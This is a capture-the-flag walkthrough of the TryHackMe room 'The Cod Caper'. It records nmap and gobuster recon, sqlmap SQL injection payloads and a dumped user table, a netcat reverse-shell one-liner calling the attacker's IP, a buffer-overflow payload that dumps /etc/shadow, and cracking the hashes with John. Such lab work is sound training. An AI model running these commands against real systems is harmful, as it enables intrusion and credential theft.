# Overview
https://tryhackme.com/room/thecodcaper

```
export IP=
```

## NMAP
```
mkdir nmap
nmap -p1-1000 -A -sC -sV -oN nmap/initial $IP
```

## Gobuster
```
gobuster dir -u "http://$IP" -w ./big.txt -x "php,txt,html" | tee gobuster.log
vagrant@ubuntu1804:~/repos/ctfs/thm/cod-caper/gobuster$ gobuster dir -u "http://$IP" -w ./big.txt -x "php,txt,html" | tee gobuster.log
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.72.177
[+] Threads:        10
[+] Wordlist:       ./big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2020/11/26 17:58:57 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/administrator.php (Status: 200)
Progress: 2308 / 20474 (11.27%)
```
The page `administrator.php` returns 200. So we good.


## sqlmap
When you see a login form, the first thing you should check is for sql injections. This is 
an automated tool for that.
```
sqlmap -u "http://$IP/administrator.php" --forms -a
```
* `-u` - Specifies which url to attack
* `--forms` - Automatically selects parameters from the `<form>` elements on the page
* `--dump` - Used to retreive data from the DB once sqli is found
* `-a` - Grabs just about everything from the DB



```
sqlmap identified the following injection point(s) with a total of 337 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=CmMg' RLIKE (SELECT (CASE WHEN (1410=1410) THEN 0x436d4d67 ELSE 0x28 END))-- AEfi&password=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=CmMg' OR (SELECT 6155 FROM(SELECT COUNT(*),CONCAT(0x71786b6271,(SELECT (ELT(6155=6155,1))),0x71786b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JnYJ&passw$
rd=

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=CmMg' OR SLEEP(5)-- zZCh&password=
---
[23:33:01] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[23:33:01] [INFO] fetching current database
[23:33:03] [INFO] retrieved: users
[23:33:03] [INFO] fetching tables for database: 'users'
[23:33:03] [INFO] used SQL query returns 1 entries
[23:33:04] [INFO] retrieved: users
[23:33:04] [INFO] fetching columns for table 'users' in database 'users'
[23:33:04] [INFO] used SQL query returns 2 entries
[23:33:05] [INFO] retrieved: username
[23:33:05] [INFO] retrieved: varchar(100)
[23:33:05] [INFO] retrieved: password
[23:33:06] [INFO] retrieved: varchar(100)
[23:33:06] [INFO] fetching entries for table 'users' in database 'users'
[23:33:07] [INFO] used SQL query returns 1 entries
[23:33:07] [INFO] retrieved: secretpass
[23:33:07] [INFO] retrieved: pingudad
Database: users
Table: users
[2 entries]
+------------+------------+
| username   | password   |
+------------+------------+
| secretpass | secretpass |
| pingudad   | pingudad   |
+------------+------------+
```

# Reverse Shell
## attacker
```
nc -lnvp 8888
```

## target
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.44.85 8888 >/tmp/f
```

Password for pingu is found manually:
```
cat /var/hidden/pass
pinguapingu
```

# pwngdb
Found buffer overflow for `/opt/secret/root`. There is a function call `shell` that will print out a pass file.
```
gdb /opt/secret/root
r < <(cyclic 50)
cyclic -l 0x6161616c
```

# Binary Exploit
```
pingu@ubuntu:/tmp$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
```

# John
```
$ cat shadow
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
$ /opt/john/run/john --wordlist=/opt/rockyou.txt shadow
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
postman          (papa)
1g 0:00:00:00 DONE (2020-11-28 06:24) 7.142g/s 154971p/s 154971c/s 154971C/s 151088..forbes
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


$ cat shadow_root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
$ /opt/john/run/john --wordlist=/opt/rockyou.txt shadow_root
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
love2fish        (root)
1g 0:00:01:11 DONE (2020-11-28 06:32) 0.01401g/s 3361p/s 3361c/s 3361C/s lucinha..lospollitos
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
